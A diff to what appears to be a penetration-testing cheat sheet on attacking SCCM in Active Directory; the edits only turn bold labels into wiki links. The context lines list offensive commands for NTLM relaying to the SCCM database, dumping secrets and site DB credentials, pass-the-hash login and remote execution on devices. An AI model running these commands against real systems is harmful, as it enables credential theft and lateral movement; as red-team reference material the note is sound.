@@ -69,7 +69,7 @@ tags:
                 - `sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>` [↗](https://github.com/garrettfoster13/sccmhunter)
 
 ## Takeover-2:relay to mssql server Simple user
-➡️ **Admin MSSQL**
+➡️ [[Admin Access|Admin MSSQL]]
 
 - SCCM MSSQL != SSCM server
     - `ntlmrelayx.py -t <sccm_mssql> -smb2support -socks` [↗](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
@@ -96,7 +96,7 @@ tags:
 - `SharpSCCM.exe local secrets -m wmi` [↗](https://github.com/Mayyhem/SharpSCCM)
 
 ## Creds-5 SCCM admin
-➡️ **Site DB credentials**
+➡️ [[Valid Credentials|Site DB credentials]]
 
 - `secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
     - `mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>` [↗](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
@@ -105,7 +105,7 @@ tags:
                 - `sccmdecryptpoc.exe <cyphered_value>`
 
 ## EXEC-1/2 SCCM admin
-➡️ **lat**
+➡️ [[Lateral Movement|lat]]
 
 - `SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner` [↗](https://github.com/Mayyhem/SharpSCCM)
 - `sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>` [↗](https://github.com/garrettfoster13/sccmhunter)
